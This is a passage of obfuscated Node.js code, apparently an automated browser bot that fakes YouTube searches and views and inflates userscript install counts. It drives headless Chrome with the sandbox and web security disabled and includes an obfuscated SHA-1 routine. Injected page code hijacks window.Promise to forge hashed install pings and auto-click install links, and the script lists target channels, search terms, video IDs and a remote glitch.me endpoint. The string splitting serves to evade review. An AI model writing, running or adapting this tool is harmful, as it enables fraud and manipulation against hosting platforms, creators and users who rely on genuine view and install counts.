                P = this['h4'],
                Q = this['blocks'];
              for (J = -0xd15 * 0x1 + -0x193d * 0x1 + 0x2662; J < 0x1 * -0x513 + 0x2538 + 0x1 * -0x1fd5; ++J)
                K = Q[J - (-0x1 * -0x227f + -0x1a1 * 0xc + -0xef0)] ^ Q[J - (-0x1097 + 0xe5 + -0xb * -0x16e)] ^ Q[J - (-0x12d8 + 0x685 * 0x1 + 0xc61 * 0x1)] ^ Q[J - (0x1 * 0x198e + -0x1f64 + 0x5e6 * 0x1)], Q[J] = K << -0x1d * -0x133 + 0x890 + -0x2b56 | K >>> -0x121f + -0x2a0 * -0x9 + -0x562;
              for (J = 0x41c + -0x25a5 + -0x5 * -0x6b5; J < -0x2f7 * -0x3 + -0x162e + 0xd5d; J += -0x17f5 + -0x2 * 0x1069 + 0x38cc)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x17d7 + 0xce1 + 0xafb | L >>> 0x930 + 0x1a1b + -0x2330) + (M & N | ~M & O) + P + (-0xad3b0ef5 + -0x4b86794 * -0x7 + 0x1 * 0xe6b2b382) + Q[J] << 0xab3 + -0x257 * -0x4 + -0x41 * 0x4f) << -0x21c7 * 0x1 + -0x1d53 + 0x8f * 0x71 | P >>> 0x2432 + -0x13e1 + 0x1036 * -0x1) + (L & (M = M << -0x1022 + -0x26a2 + 0x32 * 0x119 | M >>> -0x1 * 0x24b0 + -0x69b + 0x2b4d) | ~L & N) + O + (-0x92b667f1 + -0x9c * -0x11c4116 + 0x5 * 0xccd0b3a) + Q[J + (0x1d * 0x53 + 0x614 * -0x1 + -0x352)] << 0xe * -0x1f + -0x5e2 + 0x5 * 0x184) << -0x333 + -0xd + 0x345 | O >>> 0xeaa + -0x2 * -0x445 + 0x51 * -0x49) + (P & (L = L << 0x10b7 + -0x1 * -0x1241 + -0x22da | L >>> 0x46 * 0x2c + 0x6 * 0x1e2 + -0x7c6 * 0x3) | ~P & M) + N + (0x86d2230c + 0xe * -0xb6d6b5a + 0x73ac3579) + Q[J + (0xdba + 0xfd * 0x11 + -0x259 * 0xd)] << 0x193c + -0x2e6 + -0x6 * 0x3b9) << -0x5c + -0x85 * 0x20 + 0x1101 | N >>> 0xa96 + 0xf97 + 0x47 * -0x5e) + (O & (P = P << 0x1 * -0xc19 + -0x1 * -0x7f7 + -0x22 * -0x20 | P >>> -0x1d8e + -0x15 * 0x6d + -0x1 * -0x2681) | ~O & L) + M + (0x7d7f1848 + -0x70776473 + 0x4d7ac5c4) + Q[J + (-0x20d3 + -0x2474 + 0x454a)] << -0x1f38 + -0x5df * -0x1 + 0x1959) << 0x21a1 * -0x1 + -0x9 * 0x1b1 + 0x1 * 0x30df | M >>> -0x7 * 0x13a + -0x192a + 0x21db) + (N & (O = O << -0x2580 + 0x1 * 0xe0b + 0x1793 | O >>> 0x1 * -0x859 + 0x1a3a + -0x11df) | ~N & P) + L + (0xb * 0x1380725 + -0x3168d23 * -0x30 + 0x71cd45b * -0xa) + Q[J + (0x2 * -0x127b + -0x4 * -0x36d + 0x1746)] << 0x1e63 * 0x1 + -0x43f * -0x2 + -0x26e1, N = N << 0x23ff + -0x8fe + -0x1ae3 | N >>> 0x7b9 * -0x3 + -0x607 + 0x6 * 0x4de;
              for (; J < 0x1a4f * 0x1 + 0x59c + -0x1fc3; J += 0x2 * -0xf72 + 0x10e0 + 0xe09)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0x1f7e + 0x4bd * 0x4 + -0x326d | L >>> -0xbfc + -0x5 * -0x419 + -0x866) + (M ^ N ^ O) + P + (0x1ec55 * -0x40f5 + -0x1609 * 0x100fc + 0x84286 * 0x1f39) + Q[J] << 0x3 * -0xb2 + 0x988 + 0x3b9 * -0x2) << -0x42b + -0x41c + 0x84c | P >>> 0x1241 * -0x1 + 0x9e6 + 0x876) + (L ^ (M = M << 0xa * 0x2aa + 0x2049 + -0x3acf * 0x1 | M >>> 0x23ac + 0x4e9 * -0x1 + 0x1 * -0x1ec1) ^ N) + O + (0x35475a * 0x41c + 0x280b4440 * -0x1 + 0x13ba6d * -0x373) + Q[J + (0x1 * 0x4a9 + 0xcbf * -0x1 + 0x817)] << 0x6d2 + 0x237c + 0x5 * -0x876) << -0x151d + -0x13a2 + 0x28c4 | O >>> -0x2193 + 0xa20 + 0x178e) + (P ^ (L = L << -0x71 * -0x6 + -0x35c + 0x1 * 0xd4 | L >>> 0x6a3 + 0x21f9 + -0x2 * 0x144d) ^ M) + N + (0x1c8b2ad7 + -0x2b9380a * -0x23 + 0x1edb * -0x6bfc) + Q[J + (0x3d * 0x6b + -0x1898 + -0xe5)] << -0xe88 + -0x2 * -0x1186 + 0x1a * -0xca) << 0x140 * -0x16 + 0x1b06 + 0x7f | N >>> 0x10fc + 0x1 * -0x1d0b + 0xc2a) + (O ^ (P = P << -0xadf + -0x1aa * 0x2 + -0x5 * -0x2dd | P >>> -0x114b + -0x42 * -0x63 + -0x839) ^ L) + M + (-0x1a5db * 0x694f + 0xc1ea51fd + -0x844c9 * -0xaf1) + Q[J + (0x1c8a + -0x804 * -0x3 + 0x3493 * -0x1)] << -0xd68 + -0x14f6 + -0xa6 * -0x35) << 0x141c + -0x2f2 + -0x1125 | M >>> -0x20b4 + -0x18 * 0xba + -0x2a5 * -0x13) + (N ^ (O = O << 0x349 + 0x44d * -0x3 + -0x1 * -0x9bc | O >>> 0x1428 + 0x4c4 * -0x5 + 0x3ae) ^ P) + L + (-0x2e68df6e + 0xaa4c4c6d + -0xd09815e) + Q[J + (0x1cd * 0x2 + -0x5f5 + 0x25f)] << -0x97 * 0x35 + 0x1 * 0x1a11 + -0x46 * -0x13, N = N << -0x1eb1 + 0xd2 + 0x3 * 0x9ff | N >>> -0x1894 + -0x10c3 + 0x2959;
              for (; J < 0x118d * -0x1 + -0xc2c + 0x1 * 0x1df5; J += 0x4 * -0x2aa + 0x161f + -0xb72)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0x200b + 0x31e + -0x1a * 0x15a | L >>> -0x248b * 0x1 + -0x248 * -0xd + 0x166 * 0x5) + (M & N | M & O | N & O) + P - (-0x67c039e + -0x1 * -0x1704a59a + 0x1816e84a * 0x4) + Q[J] << -0x1725 + 0x2a3 + 0x1482) << -0x266 * -0x3 + -0xe84 + 0x757 * 0x1 | P >>> -0x1403 + -0x17c9 + 0x2be7) + (L & (M = M << -0x1 * 0x212a + -0x1160 + 0x32a8 | M >>> -0x1 * -0x26ce + -0x1be * -0x13 + -0x47e6) | L & N | M & N) + O - (-0x7bd7a842 + -0xe * -0xe350125 + 0x25d5db60) + Q[J + (0x1 * -0x14f3 + -0x101 * -0x25 + -0x1031)] << 0xec7 + 0x465 * -0x3 + -0x3 * 0x88) << 0x1ddf + 0x1262 + -0x80a * 0x6 | O >>> 0x2d7 * -0x1 + 0x2ea + 0x8) + (P & (L = L << -0x1aa9 + -0x884 * -0x2 + 0x9bf | L >>> -0x2 * -0x3e1 + 0x2521 + -0x2ce1) | P & M | L & M) + N - (0x1e8 * -0x2d1c9f + 0x1fa8ea8b * 0x1 + 0xa739e7b1) + Q[J + (-0x1f42 + 0x16 * -0xf4 + 0x343c)] << 0x1 * -0x253d + 0x18cd * -0x1 + 0x14ae * 0x3) << -0x7f8 + -0x5 * -0x733 + -0x1c02 | N >>> -0x362 * 0x8 + 0x557 * 0x4 + 0x5cf) + (O & (P = P << -0x173d + -0x2 * 0x12fb + -0x593 * -0xb | P >>> -0x16 * -0x163 + 0x1a6 * 0x7 + 0x1505 * -0x2) | O & L | P & L) + M - (0xa * -0x12bd0f77 + -0x6ae34e + 0x37b344 * 0x566) + Q[J + (0x166b + 0x149c + -0x4 * 0xac1)] << -0x10be + -0x1971 + 0x1 * 0x2a2f) << -0xb * -0x1f + 0x686 + -0x7d6 | M >>> -0x449 * -0x3 + -0x3d0 + -0x8f0) + (N & (O = O << 0x83 * -0x47 + 0x5e4 * 0x1 + 0x1e8f * 0x1 | O >>> -0x1359 + 0x1 * -0x1733 + 0x2a8e) | N & P | O & P) + L - (0x1d96be2 * -0x13 + 0xc908b1cf + -0x35016ce5) + Q[J + (0x2438 + 0x142c + -0x1 * 0x3860)] << -0x761 * 0x2 + -0x15f9 + 0x24bb, N = N << -0x734 + -0x10fb + -0x1 * -0x184d | N >>> -0xe * -0x212 + 0x2 * 0xa93 + -0x3220;
              for (; J < -0x1 * -0x1005 + -0x1 * 0x237f + -0x12a * -0x11; J += 0x93b + -0x13 * 0x75 + -0xf * 0x9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1028 + 0x6b9 * 0x1 + -0xb6e * 0x2 | L >>> 0x4d5 * 0x6 + 0x1d31 + -0x3a14) + (M ^ N ^ O) + P - (-0x4e7f2d9c + -0x295a0cfb + -0x1664f * -0x7bef) + Q[J] << -0x498 + -0x14b * -0x19 + -0x1bbb) << 0x963 + -0x285 * 0x3 + -0x1cf | P >>> 0x85 * 0x47 + -0x1389 + -0x113f) + (L ^ (M = M << 0x2 * -0x1121 + -0xd9 + 0x2339 | M >>> -0x1e53 + 0x171d + 0x738) ^ N) + O - (0x511e89b + 0x9449d5 * -0x2b + 0x4973bc56) + Q[J + (0x484 + 0x2 * 0xf81 + -0x2385 * 0x1)] << 0x221e + -0x1 * 0x1574 + -0x2 * 0x655) << -0x1f49 * -0x1 + 0x19fb + -0xf * 0x3d1 | O >>> -0x375 + 0xe * 0x103 + -0xa9a) + (P ^ (L = L << -0x2f9 * -0x5 + 0xd4 * -0x7 + -0x4f * 0x1d | L >>> -0x69 * -0x2b + 0x5c5 * 0x5 + -0x2e7a) ^ M) + N - (-0x661f9d90 + 0x5daa821e + 0x1a7b * 0x25814) + Q[J + (0x1 * 0x13d6 + -0x188b * 0x1 + -0x11 * -0x47)] << 0xbac + -0x3 * -0x18f + -0x1059) << 0x77f * 0x1 + -0x15b * -0x2 + -0xa30 | N >>> -0x91b + -0x15ba + -0x21 * -0xf0) + (O ^ (P = P << 0x2 * 0x11a5 + 0x4 * -0x980 + -0x2d4 * -0x1 | P >>> -0x20bb + 0x1b6d + 0x550) ^ L) + M - (-0x265 * 0x254bfc + 0x44f8ce4a + 0x49f3624c) + Q[J + (-0xaad + 0x104 * -0x1d + 0x1412 * 0x2)] << 0x15d0 + 0x10e7 * 0x1 + -0xbb * 0x35) << 0xd * 0xbd + -0x81d * 0x2 + -0x6a6 * -0x1 | M >>> -0x5 * -0x7b + 0x44 * 0x28 + -0x1 * 0xcec) + (N ^ (O = O << 0xa79 * -0x1 + -0xeeb + -0x5 * -0x51a | O >>> 0xa7 * -0x1f + -0x26c2 + 0x3afd) ^ P) + L - (-0x2b640e47 + -0x32d50d41 + 0xb5f41fa * 0xd) + Q[J + (-0x22fd + -0xbf7 * -0x3 + -0xe4)] << 0x335 * 0x9 + -0xb4 * 0x2b + 0x15f, N = N << 0x1 * 0x1e47 + 0x2c * 0xb0 + -0x3c69 | N >>> -0x1864 + 0xeb0 * 0x2 + -0xd * 0x62;
              this['h0'] = this['h0'] + L << -0x3 * -0x2ad + 0x1864 + -0x206b, this['h1'] = this['h1'] + M << -0x1 * -0x8b9 + -0x20 * 0x83 + 0x1 * 0x7a7, this['h2'] = this['h2'] + N << -0x1 * -0x1dba + 0xa0b + -0x1 * 0x27c5, this['h3'] = this['h3'] + O << -0x3 * -0x9f5 + 0x5 * 0x59 + -0x1f9c, this['h4'] = this['h4'] + P << -0x1905 + 0x205a + 0x1 * -0x755;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x13 * -0xe5 + -0x1492 + 0x3af & -0x3 * -0x97 + 0x1186 + 0x4 * -0x4cf] + w[J >> -0x2 * -0x1219 + 0x53 * 0xc + -0x27fe * 0x1 & 0x1 * -0x70f + -0x8cb + 0xfe9] + w[J >> 0x2380 + -0x1fb6 + -0x3b6 & 0x125 * 0x13 + 0x22a7 + -0x3857] + w[J >> -0xe3e + 0x230 + 0xb * 0x11a & -0x1cf8 + 0x117b + 0x4 * 0x2e3] + w[J >> 0x5 * 0x66 + 0xa59 + -0x419 * 0x3 & 0x83 * 0x13 + 0x1f67 + -0x2911] + w[J >> 0x92c + 0xea3 + -0x7ed * 0x3 & 0x397 + 0x3 * 0x1cd + -0x8ef * 0x1] + w[J >> 0x5d7 + -0x2502 + 0x1f2f & -0x21c + -0x1492 + -0x16bd * -0x1] + w[-0x1 * -0x5c9 + 0x1ed9 + -0x2493 & J] + w[K >> 0x196 + 0x5a4 + -0x71e & 0x12e9 + -0x2 * -0x85b + -0x8e4 * 0x4] + w[K >> 0x5c0 + 0x322 * 0x1 + -0x8ca & -0x3b3 * -0x6 + 0x215b + -0x377e] + w[K >> 0x7b * -0xf + 0xb7e + -0x167 * 0x3 & -0x67 * 0x23 + 0x25fd + -0x22b * 0xb] + w[K >> 0x7f * -0xd + 0x1db5 + -0x2 * 0xb99 & -0xe * 0x53 + 0x2e7 * -0x3 + 0x2 * 0x6a7] + w[K >> -0x1d47 + -0x1135 + 0x2e88 & 0x210b + 0x1ff * -0x10 + -0x1 * 0x10c] + w[K >> 0x22 * 0x9e + 0x528 + -0x1a1c & 0x179 * -0x11 + -0x1370 + 0x2c88] + w[K >> -0x1 * 0x1f2a + 0xcf5 + 0x1239 & -0x1fc * -0x1 + 0xb0f * 0x2 + 0x5 * -0x4cf] + w[-0x699 + -0x1612 + 0x1cba * 0x1 & K] + w[L >> 0xbb6 + 0x98e * -0x1 + -0x106 * 0x2 & 0xa21 + -0x14ce + 0xabc] + w[L >> -0xc51 * 0x2 + -0x1da8 + 0x3662 & 0x157f + -0x468 + -0x1108] + w[L >> -0x9 * -0x1a3 + 0xfee * -0x2 + -0x371 * -0x5 & -0xd3d + 0x113b + -0x3ef] + w[L >> 0x1 * 0x3f1 + -0x2234 + 0x1e53 & -0x22 * -0x8e + 0x13 * 0xf5 + -0x24fc] + w[L >> -0x177d + 0x5 * 0x77 + -0x3 * -0x712 & -0x1 * -0x39f + 0xd0b + -0x3 * 0x589] + w[L >> 0x29 * 0xe2 + -0x1cbd + -0x76d & -0x2427 + 0x22f0 + 0x146] + w[L >> 0x12f6 + -0xe39 + 0x1f * -0x27 & 0x1225 + -0x622 * -0x4 + 0x443 * -0xa] + w[0x1a1e * 0x1 + 0x1ad2 + -0x34e1 & L] + w[M >> 0xde0 + -0x1f4 + -0xbd0 & -0x1525 + 0x5b1 + 0xf83] + w[M >> 0x19 * -0xc8 + -0x1 * 0x14d6 + 0x2876 & 0xe * -0x13 + -0x7e9 * 0x3 + -0x1c * -0xe3] + w[M >> 0xb89 * 0x2 + 0x843 * -0x1 + 0xebb * -0x1 & -0x24ce + -0x1c27 * 0x1 + 0x4104] + w[M >> 0x1505 + -0x191b + 0x6 * 0xb1 & -0x3df * -0x5 + 0x2 * -0x43a + 0x4 * -0x2b6] + w[M >> 0x2265 + 0x1e2e + 0x1 * -0x4087 & 0x108 + -0x6 * 0x56d + 0x1f95] + w[M >> 0x9 * 0x1fe + 0x152b + 0x49 * -0x89 & -0x1ce + 0x26db + -0x24fe] + w[M >> -0x1 * 0x1d46 + -0x1973 + 0x9 * 0x615 & -0x121 * -0x1d + -0xaa1 + -0x1 * 0x160d] + w[0x1d89 + -0x9 * -0x6 + -0x1db0 & M] + w[N >> 0x173b * 0x1 + 0x192d + 0x464 * -0xb & 0x1456 + -0x966 * 0x3 + 0x7eb] + w[N >> -0x2031 + 0x58 * -0x13 + 0x26d1 & 0xb41 + -0x10f + -0xa23] + w[N >> -0x2 * 0x1246 + 0x1ed5 + -0x1 * -0x5cb & 0x2544 * -0x1 + -0x1681 * -0x1 + -0x2 * -0x769] + w[N >> -0x4 * 0x452 + -0x1619 * -0x1 + -0x1 * 0x4c1 & 0x4 * -0x3b9 + 0xc5 * 0x26 + 0x1 * -0xe4b] + w[N >> 0x1fc0 + -0x2f * -0x17 + 0x1 * -0x23ed & -0x26db + -0x2f * -0x10 + -0x732 * -0x5] + w[N >> -0x1fd0 + 0x2 * 0x11c5 + -0x3b2 & -0x2 * 0xba1 + -0x11ba + 0x290b] + w[N >> -0x5 * -0x3fd + -0x6 * -0x58f + 0x3547 * -0x1 & -0x18b6 + 0x189 * 0x11 + -0x55 * 0x4] + w[0x3 * -0x529 + 0x399 + 0xbf1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1923 + -0x90b + 0x2246 & -0x67 * 0x61 + -0x304 * 0x5 + 0x371a,
                J >> 0x1a99 + -0x2098 + 0x3 * 0x205 & -0xbb0 + 0x158 * 0x13 + 0x17 * -0x8f,
                J >> 0x21e2 + 0x480 + -0x265a & 0x247e + 0x7 * 0x12e + -0x2bc1,
                -0x1 * 0x113f + 0x559 + 0xce5 & J,
                K >> -0x1f39 + -0x1034 + 0x2f85 & 0x3 * 0x59a + 0x15ff + 0x25ce * -0x1,
                K >> -0x1a8d * 0x1 + -0x16c0 + 0x315d & 0xbec + -0x2f * 0x80 + 0xc93,
                K >> -0x266b + -0x3 * -0xc2c + 0x1ef & -0x1f1a + 0x2039 + 0x10 * -0x2,
                0x22a8 + 0xe39 * 0x1 + -0x1 * 0x2fe2 & K,
                L >> 0x141 * 0x1c + 0x13b8 + -0x36bc & -0x1 * -0x1a5f + 0x33d * 0x3 + -0x2317,
                L >> 0x441 + 0x1a93 * -0x1 + 0x1662 & 0xb96 * -0x1 + -0x2d * -0x1d + 0x77c,
                L >> -0x9e3 + 0x26ff + -0x1d14 & 0xf * -0xb3 + 0xcc6 + -0xb * 0x1e,
                -0xfd + -0x73 * -0x45 + -0x1d03 & L,
                M >> -0x554 * 0x4 + 0x2 * 0x1de + 0x11ac & 0x21bf + 0x2635 + -0x23 * 0x207,
                M >> -0x683 + 0x133d + 0x1 * -0xcaa & -0x7 * 0x209 + -0x20c * 0x9 + 0x1f * 0x116,
                M >> -0x1 * -0x1508 + 0x6fe * 0x2 + -0x22fc * 0x1 & -0xbf * -0x2b + 0x9d9 + -0x28ef,
                -0x1 * -0x208c + 0x12d * -0x13 + -0x936 * 0x1 & M,
                N >> -0x15d4 + -0x653 * 0x1 + 0x409 * 0x7 & -0xae2 * -0x2 + -0x2574 + 0x10af,
                N >> -0x1 * 0x7b3 + -0x2fc + -0x7 * -0x189 & -0x2c9 * -0x1 + 0xb74 + 0x3 * -0x46a,
                N >> -0x1 * -0x141d + 0xc5 * -0x2f + -0x1016 * -0x1 & 0x878 + 0x1 * -0x1185 + 0xa0c,
                0x11c9 + 0x1 * 0x15ac + -0x2676 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x7 * -0x54d + -0xf * 0xdf + -0x17f6), (K = new DataView(J))['setUint32'](-0x1 * 0x25bd + 0x1df * -0x5 + 0x2f18, this['h0']), K['setUint32'](0x14b0 + -0x3a * -0x9 + -0x16b6, this['h1']), K['setUint32'](0x16ba + -0xd7 * 0x27 + 0xa0f, this['h2']), K['setUint32'](-0x1 * -0x749 + 0x45 * -0x24 + 0x277 * 0x1, this['h3']), K['setUint32'](-0x20f * -0x5 + -0x1440 + -0xf * -0xab, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1f * 0xe9 + -0xd94 + -0x1 * -0x29cb];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x18e3 + -0x2361 + 0xa7e;
            J[-0xa7 * 0xd + -0x6 * -0x50b + 0x19 * -0xdf]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x3 * 0xb59 + -0x1803 * -0x1 + -0x3a0e] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1b59 + 0x23bb + -0xf1 * 0x43), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xf1b + 0xd5a + -0x1c74;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x57 * -0xb + -0x1 * -0x2598 + -0x2379), Promise['resolve'](0x181b + 0x3cb * -0x2 + -0x12e * 0xe);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x8d * 0x9 + 0x1049 + -0x153e; j < -0x15 * 0xb7 + 0x4 * -0x184 + -0x8e * -0x26; j++)
    i();
}
const NETWORK_PATIENCE = -0x149 + -0x384f + 0x58d8 + (0x219 + -0x29f + -0x61f * -0x2) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1a + 0x3 * -0x122 + 0x34f) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x9b7 + -0x1cf7 + -0x7 * -0x2c0; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const V = c;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f[V(0x18)](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + W(0x1b) + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1 * -0x1655 + -0x227a + 0xc2f)), searchTerms['push']([X(0x1c) + 'spyder']['repeatExte' + 'nd'](-0x1 * 0xd3f + -0x1026 + 0x1d6f)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + X(0x6))['split'](',')), searchTerms = searchTerms['flat'](-0x164 * 0xd + -0x1066 * 0x1 + 0x227d * 0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
